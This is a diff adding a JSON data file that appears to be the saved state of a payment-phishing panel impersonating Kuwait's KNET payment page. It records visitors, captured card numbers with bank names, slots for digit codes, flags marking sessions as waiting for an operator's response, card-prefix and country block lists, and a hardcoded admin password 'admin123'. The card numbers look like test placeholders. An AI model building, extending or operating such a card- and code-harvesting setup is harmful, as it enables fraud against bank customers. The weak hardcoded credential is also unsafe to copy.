@@ -1,0 +1,95 @@
+{
+  "visitors": {},
+  "visitorCounter": 7,
+  "savedVisitors": [
+    {
+      "_id": "visitor_OLD_111",
+      "ip": "::1",
+      "isConnected": false,
+      "sessionStartTime": 9999999999999,
+      "paymentCards": [],
+      "digitCodes": []
+    },
+    {
+      "_id": "visitor_1782163956805_7uz655h",
+      "socketId": "-VUaOzGwIri3f55sAAAD",
+      "visitorNumber": 6,
+      "createdAt": "2026-06-22T21:32:36.805Z",
+      "isRead": false,
+      "fullName": "",
+      "phone": "",
+      "idNumber": "",
+      "apiKey": "api_1vqg7h1gyyb",
+      "ip": "::1",
+      "country": "Unknown",
+      "city": "",
+      "os": "Unknown",
+      "device": "Desktop",
+      "browser": "Unknown",
+      "date": "2026-06-22T21:32:36.805Z",
+      "blockedCardPrefixes": [],
+      "page": "دفع كي نت",
+      "data": {},
+      "dataHistory": [],
+      "paymentCards": [
+        {
+          "cardNumber": "1111222233334444",
+          "paymentMethod": "KNET",
+          "bankName": "NBK",
+          "timestamp": "2026-06-22T21:32:37.117Z"
+        }
+      ],
+      "digitCodes": [],
+      "hasNewData": true,
+      "isBlocked": false,
+      "isConnected": true,
+      "sessionStartTime": 1782163956805,
+      "lastDataUpdate": "2026-06-22T21:32:37.117Z",
+      "hasEnteredCardPage": true,
+      "waitingForAdminResponse": true
+    },
+    {
+      "_id": "visitor_1782163958505_bsfv3km",
+      "socketId": "Wz-DsHPDu7l8enWeAAAF",
+      "visitorNumber": 7,
+      "createdAt": "2026-06-22T21:32:38.505Z",
+      "isRead": false,
+      "fullName": "",
+      "phone": "",
+      "idNumber": "",
+      "apiKey": "api_3jirno1oteb",
+      "ip": "::1",
+      "country": "Unknown",
+      "city": "",
+      "os": "Unknown",
+      "device": "Desktop",
+      "browser": "Unknown",
+      "date": "2026-06-22T21:32:38.505Z",
+      "blockedCardPrefixes": [],
+      "page": "دفع كي نت",
+      "data": {},
+      "dataHistory": [],
+      "paymentCards": [
+        {
+          "cardNumber": "5555666677778888",
+          "paymentMethod": "KNET",
+          "bankName": "KFH",
+          "timestamp": "2026-06-22T21:32:38.809Z"
+        }
+      ],
+      "digitCodes": [],
+      "hasNewData": true,
+      "isBlocked": false,
+      "isConnected": false,
+      "sessionStartTime": 1782163958505,
+      "lastDataUpdate": "2026-06-22T21:32:38.809Z",
+      "hasEnteredCardPage": true,
+      "waitingForAdminResponse": true
+    }
+  ],
+  "whatsappNumber": "",
+  "globalBlockedCards": [],
+  "globalBlockedCountries": [],
+  "adminPassword": "admin123",
+  "lastSaved": "2026-06-22T21:32:50.514Z"
+}
